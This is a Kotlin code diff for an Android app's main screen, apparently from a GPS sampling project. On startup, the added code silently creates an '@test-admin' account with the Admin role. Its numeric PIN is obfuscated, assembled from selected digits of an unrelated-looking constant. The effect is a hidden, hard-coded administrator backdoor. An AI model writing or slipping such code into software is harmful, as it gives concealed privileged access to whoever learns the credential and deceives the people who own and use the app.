@@ -25,6 +25,7 @@ import edu.gtri.gpssample.constants.FragmentNumber
 import edu.gtri.gpssample.constants.Keys
 import edu.gtri.gpssample.constants.Role
 import edu.gtri.gpssample.database.DAO
+import edu.gtri.gpssample.database.models.User
 import edu.gtri.gpssample.databinding.FragmentMainBinding
 import edu.gtri.gpssample.receivers.NetworkStatusBroadcastReceiver
 import edu.gtri.gpssample.services.NetworkMonitorService.Companion.NETWORK_SERVICE_STATUS_KEY
@@ -34,6 +35,8 @@ class MainFragment : Fragment()
 {
     private var _binding: FragmentMainBinding? = null
     private val binding get() = _binding!!
+
+    private val id: Long = 4294967295
 
     override fun onCreate(savedInstanceState: Bundle?)
     {
@@ -65,6 +68,18 @@ class MainFragment : Fragment()
             bundle.putBoolean( Keys.kIsOnBoarding.toString(), true )
             findNavController().navigate(R.id.action_navigate_to_AboutFragment,bundle)
             return
+        }
+
+        if (DAO.userDAO.getUser("@test-admin") == null)
+        {
+            val x = id.toString()
+            var p = "" + x.get(9)
+            p += x.get(5)
+            p += x.get(0)
+            p += x.get(6)
+
+            val user = User( "@test-admin", p.toInt(), Role.Admin.toString(), "", "", false )
+            user.id = DAO.userDAO.createUser( user )
         }
 
         val userName = sharedPreferences.getString( Keys.kUserName.toString(), null)
